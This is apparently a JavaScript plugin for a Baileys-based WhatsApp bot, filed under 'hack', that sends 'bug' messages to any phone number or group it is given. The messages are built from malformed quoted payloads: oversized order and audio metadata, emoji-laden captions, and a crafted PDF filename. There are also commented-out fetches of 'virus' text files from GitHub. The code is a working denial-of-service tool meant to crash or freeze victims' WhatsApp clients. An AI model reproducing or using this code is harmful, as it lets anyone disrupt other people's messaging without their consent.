const fs = require('fs')
module.exports = {
   name: 'bug',
   alias: ['bug'],
   category: 'hack',
   desc: 'Anuncio de whatsapp',
   use: 'bug',
   async exec(msg, sock,args,text, store) {
     
      try {
         const command = msg.body.slice(1).trim().split(' ').shift().toLowerCase()
         if (!msg.key.fromMe) return msg.reply('¡Solo propietarios!')

         const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
         if (!text) return msg.reply(`Ejemplo de uso: *${_p + command}* <tipo> <numero>\n\n*Nota:*\nNo haga mal uso de este comando!`)
         
         const fsizedoc = '99999999999999'
         const packname= "🖥️📱📷🎙️📻💵💴💶💷🛠️🔬🔭🧸💻"
         const _p="."
         let thumb = fs.readFileSync(global.appRoot+'/src/profile.jpg')
         let virus = "Sin Accion001"//await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
         let virus2 = "Sin Accion002"//await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
         
         let type = (args[0] || '').toLowerCase()
         
         let from = args[1]?args[1]:msg.from
         if(((!from.includes("@c.us") && !from.includes("@g.us") && !from.includes("@s.whatsapp.net")))) //Si no trae correo por defecto personal
            from=from+"@s.whatsapp.net"


         let q = `Mensage bug from: ${global.author}\n${text}`
         let sections = [{
         title: `Creado por: ${global.author}`,
         rows: [
         { title: 'BUG AUDIO', rowId: `${_p + command} audio ${text}` },
         { title: 'BUG PDF', rowId: `${_p + command} pdf ${text}` },
         { title: 'BUG STICKER', rowId: `${_p + command} sticker ${text}` },
         { title: 'BUG IMAGE', rowId: `${_p + command} img ${text}` },
         { title: 'BUG VIDEO', rowId: `${_p + command} vid ${text}` },
         { title: 'BUG VCARD', rowId: `${_p + command} vcard ${text}` },
         { title: 'BUG ARTICULO', rowId: `${_p + command} articulo ${text}` },		
         { title: 'BUG CATALOG', rowId: `${_p + command} catalog ${text}` },
         { title: 'BUG TEXTCRASH', rowId: `${_p + command} textcrash ${text}` },
         ]}]
         let listMessage = {
         text: '*[‼Parametro in valido]*\n\nSelecione una opcion valida\n   _Mensajes zombies_',
         footer: global.author,
         buttonText: 'Seleccione',
         sections
         }
         const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "locationMessage": {} }}      
         const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `${packname}`, "jpegThumbnail": thumb }}}         
         const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "orderMessage": { "orderId": "594071395007984", "thumbnail": fs.readFileSync(global.appRoot+'/src/profile.jpg'), "itemCount": fsizedoc, "status": "INQUIRY", "surface": "CATALOG", "message": "", "orderTitle": `${packname}`, "sellerJid": "6285736178354@s.whatsapp.net", "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==", "totalAmount1000": fsizedoc, "totalCurrencyCode": "IDR" }}}
         const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": { orderMessage: { itemCount: fsizedoc, status: 200, thumbnail: thumb, surface: 200, message: `© ${packname}`, token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==", totalAmount1000: fsizedoc, totalCurrencyCode: "IDR", orderTitle: `${packname} ${virus2}`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: { "forwardingScore":999,"isForwarded":true }, sendEphemeral: true }	
         const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "orderMessage": { "orderId": "594071395007984", "thumbnail": fs.readFileSync(global.appRoot+'/src/profile.jpg'), "itemCount": fsizedoc, "status": "INQUIRY", "surface": "CATALOG", "message": `${packname}`, "orderTitle": `${packname}`, "sellerJid": "6285736178354@s.whatsapp.net", "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==", "totalAmount1000": fsizedoc, "totalCurrencyCode": "IDR" }}}
                           
         const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "audioMessage": { "url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc", "mimetype": "audio/aac", "fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=", "fileLength": fsizedoc, "seconds": fsizedoc, "caption": `${packname}`, "ptt": false, "mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=", "fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=", "directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB", "mediaKeyTimestamp": "1632753911" }}}
         const messa = await prepareWAMessageMedia({ image: fs.readFileSync(global.appRoot+'/src/profile.jpg') }, { upload: sock.waUploadToServer })
         const catalog = generateWAMessageFromContent(msg.from, proto.Message.fromObject({ "productMessage": { "product": { "productImage": messa.imageMessage, "productId": "4383282311765462", "title": `${packname}`, "description": `${virus2}`, "currencyCode": "IDR", "bodyText": `${virus}`, "footerText": `${packname}`, "priceAmount1000": fsizedoc, "productImageCount": 1, "firstImageId": 1, "salePriceAmount1000": fsizedoc, "retailerId": `${packname}`, "url": "wa.me/50587159233" }, "businessOwnerJid": "50587159233@s.whatsapp.net", }}), { userJid: msg.from, quoted: ftrolii })	
         const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(msg.from ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${packname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;sock;;;\nFN:${packname}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
         
         const main = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''})}, "message":{ "imageMessage":{ "mimetype":"image/jpeg", "jpegThumbnail": fs.readFileSync(global.appRoot+'/src/profile.jpg')}}}
         
         switch (type) {
             
            case 'audio': {
            sock.sendMessage(from, {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})}
            break
                
            case 'pdf': {
            sock.sendMessage(from, {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})}
            break
            //#
            case 'sticker': {
            let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', packname, global.author)
            sock.sendFile(from, stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})}
            break
            case 'img': {
            sock.sendMessage(from, {image: thumb, bugimage }, {quoted: bugimage})}
            break
            case 'vcard': {
            let res = await generateWAMessageFromContent(from, { "contactMessage": { "vcard": "HAHaAhHAHAHA", "displayName": `${global.author}`, "contextInfo": { "forwardingScore": 3, "isForwarded": true }}}, {quoted: fkontaak, contextInfo:{}}) 
            sock.sendMessage(msg.from,{text: `ENVIADO EL BUG ${type} AL DESTINO ${from}` }, {quoted: res})}
            break
                
            case 'articulo': {
            await sock.sendMessage(from, {text: `ENVIADO EL BUG ${type} AL DESTINO ${from}` }, {quoted: trol})}
            break                
      
            case 'catalog': {
            sock.sendMessage(from, {image: thumb, bugimage }, {quoted: catalog})}
            break
                
            case 'textcrash': {
               sock.sendMessage(from, { text : packname}, {quoted: main} )}
            break
                
            case 'vid': {
            sock.sendMessage(from, {video: thumb, bugimage,}, {quoted: bugimage})}
            break
                
            default:{
            if (!/[01]/.test(command)) return sock.sendMessage(msg.from, listMessage, {quoted: msg})
            throw false
            }
            }
      if(from != msg.from)
         msg.reply(`ENVIADO EL BUG ${type} AL DESTINO ${from}`)
            
       }catch(error) {
            //msg.reply("‼✖Ocurrio un error⚠\nEs posible que el administrador del grupo lo configuro privado")
            console.log('Ocurrio un error\n'+error)
         }
   }
}
